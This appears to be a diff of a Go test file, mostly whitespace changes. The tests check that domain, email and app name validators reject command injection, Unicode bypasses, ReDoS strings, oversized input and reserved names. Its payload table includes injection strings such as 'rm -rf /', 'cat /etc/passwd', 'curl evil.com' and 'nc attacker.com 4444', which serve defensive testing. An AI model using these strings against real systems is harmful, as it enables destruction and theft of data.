@@ -29,48 +29,48 @@ func TestCommandInjectionPrevention(t *testing.T) {
 		// Command injection via semicolons
 		{"semicolon_command", "example.com;rm -rf /", "domain"},
 		{"double_semicolon", "test.com;;cat /etc/passwd", "domain"},
-		
+
 		// Pipe-based command injection
 		{"pipe_command", "example.com|whoami", "domain"},
 		{"double_pipe", "test.com||curl evil.com", "domain"},
-		
+
 		// Backtick command substitution
 		{"backtick_command", "example.com`id`", "domain"},
 		{"backtick_nested", "test.com`cat /etc/hosts`", "domain"},
-		
+
 		// Dollar sign variable/command substitution
 		{"dollar_command", "example.com$(whoami)", "domain"},
 		{"dollar_variable", "test.com$HOME", "domain"},
-		
+
 		// Ampersand background execution
 		{"ampersand_bg", "example.com&ping evil.com", "domain"},
 		{"double_ampersand", "test.com&&curl attacker.com", "domain"},
-		
+
 		// Newline/carriage return injection
 		{"newline_injection", "example.com\nrm -rf /", "domain"},
 		{"carriage_return", "test.com\rcurl evil.com", "domain"},
 		{"crlf_injection", "example.com\r\nwget malware.exe", "domain"},
-		
+
 		// Quote escaping attempts
 		{"single_quote", "example.com'", "domain"},
 		{"double_quote", "example.com\"", "domain"},
 		{"quote_escape", "example.com\\'", "domain"},
-		
+
 		// Redirection attempts
 		{"redirect_output", "example.com>output.txt", "domain"},
 		{"redirect_input", "example.com<input.txt", "domain"},
 		{"append_redirect", "example.com>>log.txt", "domain"},
-		
+
 		// Null byte injection
 		{"null_byte", "example.com\x00", "domain"},
 		{"null_byte_command", "example.com\x00rm -rf /", "domain"},
-		
+
 		// Email field injection attacks
 		{"email_semicolon", "user@example.com;curl evil.com", "email"},
 		{"email_pipe", "user@test.com|nc attacker.com 4444", "email"},
 		{"email_backtick", "user@example.com`whoami`", "email"},
 		{"email_newline", "user@test.com\nrm -rf /", "email"},
-		
+
 		// App name injection attacks
 		{"app_semicolon", "myapp;rm -rf /", "appname"},
 		{"app_pipe", "myapp|whoami", "appname"},
@@ -81,7 +81,7 @@ func TestCommandInjectionPrevention(t *testing.T) {
 	for _, tc := range injectionPayloads {
 		t.Run(tc.name, func(t *testing.T) {
 			var err error
-			
+
 			switch tc.field {
 			case "domain":
 				err = ValidateDomainName(tc.payload)
@@ -90,16 +90,16 @@ func TestCommandInjectionPrevention(t *testing.T) {
 			case "appname":
 				err = ValidateAppName(tc.payload)
 			}
-			
+
 			// All injection attempts should be rejected
 			testutil.AssertError(t, err)
-			
+
 			// Verify error message doesn't expose the dangerous payload
 			if err != nil {
 				errorMsg := err.Error()
 				// Error should mention invalid character but not echo the full payload
 				testutil.AssertContains(t, errorMsg, "invalid character")
-				
+
 				// Ensure dangerous parts aren't reflected in error
 				dangerousChars := []string{";", "|", "`", "$", "&", "\n", "\r"}
 				for _, dangerous := range dangerousChars {
@@ -122,29 +122,29 @@ func TestUnicodeNormalizationAttacks(t *testing.T) {
 		// Unicode normalization bypasses
 		{"unicode_semicolon", "example.com\uFF1Brm -rf /", "domain"}, // Fullwidth semicolon
 		{"unicode_pipe", "test.com\uFF5Cwhoami", "domain"},           // Fullwidth vertical bar
-		{"unicode_backtick", "example.com\uFF40id\uFF40", "domain"},   // Fullwidth grave accent
-		
+		{"unicode_backtick", "example.com\uFF40id\uFF40", "domain"},  // Fullwidth grave accent
+
 		// Zero-width characters
 		{"zero_width_space", "example\u200B.com", "domain"},
 		{"zero_width_joiner", "test\u200D.com", "domain"},
 		{"zero_width_non_joiner", "example\u200C.com", "domain"},
-		
+
 		// Invisible characters
 		{"invisible_separator", "example\u2063.com", "domain"}, // Invisible separator
-		{"invisible_times", "test\u2062.com", "domain"},       // Invisible times
-		
+		{"invisible_times", "test\u2062.com", "domain"},        // Invisible times
+
 		// Homograph attacks
-		{"cyrillic_a", "еxample.com", "domain"}, // Cyrillic 'е' instead of 'e'
+		{"cyrillic_a", "еxample.com", "domain"},   // Cyrillic 'е' instead of 'e'
 		{"mixed_script", "exаmple.com", "domain"}, // Mixed Latin/Cyrillic
-		
+
 		// RTL/LTR override attacks
 		{"rtl_override", "example\u202E.com", "domain"},
 		{"ltr_override", "test\u202D.com", "domain"},
-		
+
 		// Email Unicode attacks
 		{"email_unicode_semicolon", "user@example.com\uFF1Bcurl evil.com", "email"},
 		{"email_zero_width", "user\u200B@test.com", "email"},
-		
+
 		// App name Unicode attacks
 		{"app_unicode_pipe", "myapp\uFF5Cwhoami", "appname"},
 		{"app_zero_width", "my\u200Bapp", "appname"},
@@ -153,7 +153,7 @@ func TestUnicodeNormalizationAttacks(t *testing.T) {
 	for _, tc := range unicodePayloads {
 		t.Run(tc.name, func(t *testing.T) {
 			var err error
-			
+
 			switch tc.field {
 			case "domain":
 				err = ValidateDomainName(tc.payload)
@@ -162,7 +162,7 @@ func TestUnicodeNormalizationAttacks(t *testing.T) {
 			case "appname":
 				err = ValidateAppName(tc.payload)
 			}
-			
+
 			// All Unicode-based bypass attempts should be rejected
 			testutil.AssertError(t, err)
 		})
@@ -180,15 +180,15 @@ func TestRegexCatastrophicBacktracking(t *testing.T) {
 		// Nested quantifiers that could cause exponential backtracking
 		{"nested_quantifiers_domain", strings.Repeat("a", 100) + "!" + strings.Repeat("a", 100) + ".com", "domain"},
 		{"alternation_bomb_domain", strings.Repeat("(a|a)", 20) + ".com", "domain"},
-		
+
 		// Email regex bombs
 		{"email_alternation_bomb", strings.Repeat("(a|a)", 15) + "@test.com", "email"},
 		{"email_nested_quantifiers", strings.Repeat("a", 50) + "!" + strings.Repeat("a", 50) + "@example.com", "email"},
-		
+
 		// App name regex bombs
 		{"app_alternation_bomb", strings.Repeat("(a|a)", 15), "appname"},
 		{"app_nested_quantifiers", strings.Repeat("a", 30) + "!" + strings.Repeat("a", 30), "appname"},
-		
+
 		// Pathological cases for domain validation
 		{"pathological_subdomain", strings.Repeat("a", 63) + "." + strings.Repeat("b", 63) + ".com", "domain"},
 		{"many_dots", strings.Repeat("a.", 50) + "com", "domain"},
@@ -199,7 +199,7 @@ func TestRegexCatastrophicBacktracking(t *testing.T) {
 			// Use a timeout to detect if regex takes too long (potential ReDoS)
 			done := make(chan bool, 1)
 			var err error
-			
+
 			go func() {
 				switch tc.field {
 				case "domain":
@@ -211,7 +211,7 @@ func TestRegexCatastrophicBacktracking(t *testing.T) {
 				}
 				done <- true
 			}()
-			
+
 			select {
 			case <-done:
 				// Validation completed - should have been rejected
@@ -235,15 +235,15 @@ func TestLengthBasedAttacks(t *testing.T) {
 		{"max_domain_length", func() string { return strings.Repeat("a", MaxDomainLength+1) + ".com" }, "domain", MaxDomainLength},
 		{"huge_domain", func() string { return strings.Repeat("a", 1000) + ".com" }, "domain", MaxDomainLength},
 		{"mega_domain", func() string { return strings.Repeat("a", 10000) + ".com" }, "domain", MaxDomainLength},
-		
-		// Email length attacks  
+
+		// Email length attacks
 		{"max_email_length", func() string { return strings.Repeat("a", MaxEmailLength-10) + "@test.com" }, "email", MaxEmailLength},
 		{"huge_email", func() string { return strings.Repeat("a", 1000) + "@example.com" }, "email", MaxEmailLength},
-		
+
 		// App name length attacks
 		{"max_app_length", func() string { return strings.Repeat("a", MaxAppNameLength+1) }, "appname", MaxAppNameLength},
 		{"huge_app_name", func() string { return strings.Repeat("a", 500) }, "appname", MaxAppNameLength},
-		
+
 		// Label length attacks (DNS label limit)
 		{"oversized_label", func() string { return strings.Repeat("a", 64) + ".com" }, "domain", 63},
 		{"multiple_oversized", func() string { return strings.Repeat("a", 64) + "." + strings.Repeat("b", 64) + ".com" }, "domain", 63},
@@ -253,7 +253,7 @@ func TestLengthBasedAttacks(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			payload := tc.generator()
 			var err error
-			
+
 			switch tc.field {
 			case "domain":
 				err = ValidateDomainName(payload)
@@ -262,10 +262,10 @@ func TestLengthBasedAttacks(t *testing.T) {
 			case "appname":
 				err = ValidateAppName(payload)
 			}
-			
+
 			// All length-based attacks should be rejected
 			testutil.AssertError(t, err)
-			
+
 			// Verify error mentions length limit
 			if err != nil {
 				errorMsg := strings.ToLower(err.Error())
@@ -285,7 +285,7 @@ func TestSuspiciousDomainDetection(t *testing.T) {
 		"127.0.0.1",
 		"::1",
 		"0.0.0.0",
-		
+
 		// Internal domains
 		"internal",
 		"local",
@@ -293,12 +293,12 @@ func TestSuspiciousDomainDetection(t *testing.T) {
 		"*.internal",
 		"app.local",
 		"service.internal",
-		
+
 		// Mixed case attempts
 		"LocalHost",
 		"INTERNAL",
 		"Local",
-		
+
 		// Subdomain attempts
 		"test.localhost",
 		"app.internal",
@@ -309,7 +309,7 @@ func TestSuspiciousDomainDetection(t *testing.T) {
 		t.Run("suspicious_"+strings.ReplaceAll(domain, ".", "_"), func(t *testing.T) {
 			err := ValidateDomainName(domain)
 			testutil.AssertError(t, err)
-			
+
 			if err != nil {
 				errorMsg := strings.ToLower(err.Error())
 				testutil.AssertContains(t, errorMsg, "suspicious")
@@ -334,7 +334,7 @@ func TestReservedNameValidation(t *testing.T) {
 	criticalReservedNames := []string{
 		"admin", "root", "system", "daemon", "www", "ftp", "mail",
 	}
-	
+
 	productionReservedNames := []string{
 		"api", "app", "web", "db", "database", "cache", "redis",
 		"vault", "consul", "docker", "kubernetes", "k8s",
@@ -347,7 +347,7 @@ func TestReservedNameValidation(t *testing.T) {
 			testutil.AssertError(t, err)
 			testutil.AssertContains(t, err.Error(), "reserved")
 		})
-		
+
 		// Test case variations
 		t.Run("critical_reserved_upper_"+name, func(t *testing.T) {
 			err := ValidateAppName(strings.ToUpper(name))
